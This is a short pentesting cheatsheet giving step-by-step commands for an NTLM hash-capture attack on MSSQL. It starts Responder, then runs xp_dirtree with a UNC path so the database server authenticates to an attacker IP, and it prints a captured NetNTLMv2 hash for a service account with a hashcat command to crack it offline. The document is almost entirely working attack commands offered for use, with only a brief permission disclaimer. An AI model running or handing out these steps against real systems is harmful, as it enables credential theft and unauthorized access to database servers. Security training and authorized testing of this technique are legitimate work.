---
title: "Responder Attack Guide for MSSQL Exploitation"
date: 2025-02-18 12:00:00 +0700
categories: [Cheatsheets]
tags: [Responder, MSSQL, Pentesting, Red Teaming, Exploitation]
pin: false
---

# Responder Attack via MSSQL

## **Overview**
This guide explains how to use **Responder** to capture NTLM hashes from an MSSQL server and crack them using **Hashcat**.

---

## **Step 1: Start Responder**
To listen for incoming authentication requests on your attacking machine:
```bash
responder -I tun0
```

---

## **Step 2: Trigger NTLM Hash Capture from MSSQL**
Execute the following command in MSSQL to force authentication to the attacking machine:
```sql
xp_dirtree '\\10.10.14.12\a';
```
This will send NTLM authentication attempts to **Responder** running on **10.10.14.12**.

---

## **Step 3: Crack Captured Hash with Hashcat**
Once the NTLM hash appears in **Responder**, use **Hashcat** to crack it:
```bash
hashcat -m 5600 mssql-svc::QUERIER:4141414141414141:790d1a20ff18cdb330b3b6e43bca6988:010100000000000000e901777b28d50126ad6b81542b18860000000001001000780051004d005a004a006f004f00730002001000780048004f00540045006b006300610003001000780051004d005a004a006f004f00730004001000780048004f00540045006b00630061000700080000e901777b28d50106000400020000000800300030000000000000000000000000300000590946bc19d0765a150c1c561e8ea40b9f0627e137bb3b8950ad8952e5b6f3930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003600000000000000000000000000 /usr/share/wordlists/rockyou.txt
```

Once the password is cracked, you can use it to authenticate to the MSSQL server.

---

**Note:** Ensure that you have permission to perform these actions, as unauthorized use may violate ethical guidelines.

